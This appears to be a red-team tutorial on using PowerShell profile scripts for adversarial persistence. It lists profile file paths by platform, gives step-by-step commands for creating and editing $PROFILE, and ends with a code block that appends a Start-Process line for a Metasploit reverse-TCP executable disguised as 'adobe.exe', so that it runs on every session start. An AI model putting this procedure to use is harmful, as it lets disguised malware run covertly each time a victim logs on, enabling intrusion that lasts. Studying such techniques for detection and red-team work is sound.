Greetings, fellow learners! Today, we're going to explore a captivating subject: How to achieving Prolonged Persistence using PowerShell Profile Scripts. I've got one of my interesting topic for you today, "Prolonged Adversarial Persistence." So, if you're ready, let's dive right in.

To provide some clarity, we can refer to it as "Event-Triggered Execution," an event that is invoked each time a command is executed. Groups like Turla, also known as Snake, employed PowerShell scripts for direct, in-memory loading and execution of malicious executables and libraries. This approach enabled them to bypass detection mechanisms that typically trigger when a malicious executable is saved to disk.

PowerShell offers the flexibility to create various profiles tailored to individual users and host programs. Creating a PowerShell profile is a common practice among those who work extensively with PowerShell. It enables users to customize their environment, including configurations, functions, modules, and more, and to execute specific commands when a PowerShell session starts. Users also leverage profiles for automatically mapping network drives or shared resources.

Breaking down the term "Profile," it's essentially an automatic variable, namely `$PROFILE`, used to store the paths to the PowerShell profiles available in the current session. Remember that the script within these profiles is executed each time a user logs on. As mentioned earlier, different profiles exist for different users and hosts. Consequently, there are distinct paths for various profile types:

## Profile Paths for Different Profile Types:
```
    All Users, All Hosts
        Windows - $PSHOME\Profile.ps1
        Linux - /opt/Microsoft/powershell/7/profile.ps1
        macOS - /usr/local/Microsoft/powershell/7/profile.ps1
    All Users, Current Host
        Windows - $PSHOME\Microsoft.PowerShell_profile.ps1
        Linux - /opt/Microsoft/powershell/7/Microsoft.PowerShell_profile.ps1
        macOS - /usr/local/microsoft/powershell/7/Microsoft.PowerShell_profile.ps1
    Current User, All Hosts
        Windows - $HOME\Documents\PowerShell\Profile.ps1
        Linux - ~/.config/PowerShell/profile.ps1
        macOS - ~/.config/PowerShell/profile.ps1
    Current user, Current Host
        Windows - $HOME\Documents\PowerShell\Microsoft.PowerShell_profile.ps1
        Linux - ~/.config/PowerShell/Microsoft.PowerShell_profile.ps1
        macOS - ~/.config/PowerShell/Microsoft.PowerShell_profile.ps1
```

Now, let's delve into the steps required to implement this technique:

1. Check the current Profile Path:
   ```
   Test-Path $PROFILE
   ```
   ![image](https://github.com/TechnologyMediaorg/red-teaming-specials/assets/111997815/b0b1930e-cd38-4b4f-a3e5-c0c2e0cce6b4)

3. View the Profile path:
   ```
   echo $PROFILE
   ```
   ![image](https://github.com/TechnologyMediaorg/red-teaming-specials/assets/111997815/ec6f961c-829a-4df7-a3e9-998d86f90996)

4. Verify if a profile already exists:
   ```
   Test-Path -Path $PROFILE
   ```
   ![image](https://github.com/TechnologyMediaorg/red-teaming-specials/assets/111997815/3c5c6102-d83b-4a2a-b2a5-afc8b3562d2a)
   > This command should return either True or False as a response.

If the profile doesn't exist, don't worry. Here's how you can create a new profile for the current user:
```
New-Item -ItemType File -Path $PROFILE -Force
```

4. Modify profile.ps1:
   > Edit it with your preferred text editor, and your payload will execute on every login.
   
   ``` notepad $PROFILE```
> You can even utilize this technique with Metasploit. For instance, here's an example of requesting PowerShell to execute a malicious .exe payload generated using Metasploit for reverse TCP:

```
if (!(Test-Path -Path $PROFILE)) {
  New-Item -ItemType File -Path $PROFILE -Force
}
$string = 'Start-Process "E:\Documents\Desktop\adobe.exe"'
$string | Out-File -FilePath "C:\Users\User\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1" -Append
```

Now, you have the tools and knowledge to achieve prolonged adversarial persistence with PowerShell Profile Scripts. 
![image](https://github.com/TechnologyMediaorg/red-teaming-specials/assets/111997815/fb4daf6b-0461-4793-9ce7-c7ba256608f7)

Enjoy exploring this powerful technique!
